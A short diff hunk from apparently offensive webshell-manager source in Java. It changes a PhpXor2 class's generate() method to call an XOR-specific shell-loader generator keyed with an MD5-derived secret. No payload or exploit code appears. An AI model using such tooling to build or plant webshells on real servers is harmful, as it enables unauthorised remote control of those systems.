@@ -116,7 +116,7 @@ public class PhpXor2 implements Cryption {
 
     @Override
     public byte[] generate(String password, String secretKey) {
-        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+        return Generate.GenerateShellLoderXor2(password, functions.md5(secretKey).substring(0, 16), false);
     }
 }
 
